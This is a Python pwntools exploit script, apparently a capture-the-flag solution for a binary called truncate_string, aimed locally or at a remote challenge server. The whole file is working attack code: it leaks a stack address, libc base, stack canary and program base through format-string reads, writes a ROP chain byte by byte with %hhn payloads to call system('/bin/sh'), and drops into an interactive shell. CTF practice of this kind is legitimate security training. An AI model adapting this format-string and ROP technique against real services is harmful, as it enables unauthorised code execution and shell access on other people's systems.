#coding:utf-8
import sys
from pwn import *
# context.log_level='debug'
context.arch='amd64'
global i
i=0
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./truncate_string')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			# elf=ELF('./truncate_string')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			# one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('nc.eonew.cn',10012)
			# elf=ELF('./truncate_string')
			# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			# one_gadget = [0x4f2c5,0x4f322,0x10a38c]



		def fmt(addr1,addr2):
			arg0=(addr1)&0xff
			arg1=(addr1&0xff00)>>8
			arg2=(addr1&0xff0000)>>16
			arg3=(addr1&0xff000000)>>24
			arg4=(addr1&0xff00000000)>>32
			arg5=(addr1&0xff0000000000)>>40
			arg6=(addr1&0xff000000000000)>>48
			arg7=(addr1&0xff00000000000000)>>56
			#pay=fmtstr_payload(8,{elf.got['printf']:system_addr})
			pay1='%'+str(arg0)+'c%10$hhn'
			pay2='%'+str(arg1)+'c%10$hhn'
			pay3='%'+str(arg2)+'c%10$hhn'
			pay4='%'+str(arg3)+'c%10$hhn'
			pay5='%'+str(arg4)+'c%10$hhn'
			pay6='%'+str(arg5)+'c%10$hhn'
			pay7='%'+str(arg6)+'c%10$hhn'
			pay8='%'+str(arg7)+'c%10$hhn'
			if arg0==0 :
				pay1='%10$hhn'
			if arg1==0 :
				pay2='%10$hhn'
			if arg2==0 :
				pay3='%10$hhn'
			if arg3==0 :
				pay4='%10$hhn'
			if arg4==0 :
				pay5='%10$hhn'
			if arg5==0 :
				pay6='%10$hhn'
			if arg6==0 :
				pay7='%10$hhn'
			if arg7==0 :
				pay8='%10$hhn'
			pay1=pay1.ljust(0x10,'a')
			pay2=pay2.ljust(0x10,'a')
			pay3=pay3.ljust(0x10,'a')
			pay4=pay4.ljust(0x10,'a')
			pay5=pay5.ljust(0x10,'a')
			pay6=pay6.ljust(0x10,'a')
			pay7=pay7.ljust(0x10,'a')
			pay8=pay8.ljust(0x10,'a')
			
			pay1+=p64(addr2)
			pay2+=p64(addr2+1)
			pay3+=p64(addr2+2)
			pay4+=p64(addr2+3)
			pay5+=p64(addr2+4)
			pay6+=p64(addr2+5)
			pay7+=p64(addr2+6)
			pay8+=p64(addr2+7)

			io.sendline(pay1)
			sleep(0.1)
			io.sendline(pay2)
			sleep(0.1)
			io.sendline(pay3)
			sleep(0.1)
			io.sendline(pay4)
			sleep(0.1)
			io.sendline(pay5)
			sleep(0.1)
			io.sendline(pay6)
			sleep(0.1)
			io.sendline(pay7)
			sleep(0.1)
			io.sendline(pay8)
			sleep(0.1)
			io.recv()



		pay='%1$p'
		io.sendline(pay)
		buf_addr=int(io.recvline(),16)+0x118
		io.sendline('%43$p')
		libc_base=(int(io.recvline(),16)&0xfffffffffffff000)-0x21000
		# libc.address=libc_base
		io.sendline('%41$p')
		cannry=int(io.recvline(),16)
		io.sendline('%47$p')
		main_addr=int(io.recvline(),16)
		elf_base=main_addr-0x88a
		system_addr=0xBAAA0+libc_base
		bin_sh_addr=0x1668DE+libc_base
		pop_rdx=0x1b96+libc_base
		pop_rsi_r15=elf_base+0xa11
		pop_rdi=elf_base+0xa13
		fmt(pop_rdi,buf_addr)
		fmt(bin_sh_addr,buf_addr+8)
		fmt(pop_rsi_r15,buf_addr+0x10)
		fmt(0,buf_addr+0x18)
		fmt(0,buf_addr+0x20)
		fmt(pop_rdx,buf_addr+0x28)
		fmt(0,buf_addr+0x30)
		fmt(system_addr,buf_addr+0x38)
		for i in range (100):
			pay='%'+str(i)+'$p'
			io.sendline(pay)
			success(str(i)+': '+io.recvline())

		# pay='%9$saaaa'+p64(system_addr)
		# io.sendline(pay)
		# io.recv()



		
		success('buf_addr:'+hex(buf_addr))
		success('elf_addr:'+hex(elf_base))
		success('cannry:'+hex(cannry))
		success('libc_base:'+hex(libc_base))
		#gdb.attach(io)
		#pause()
		io.interactive()

	# except Exception as e:
	# 	i+=1
	# 	io.close()
	# 	continue
	# else:
	# 	continue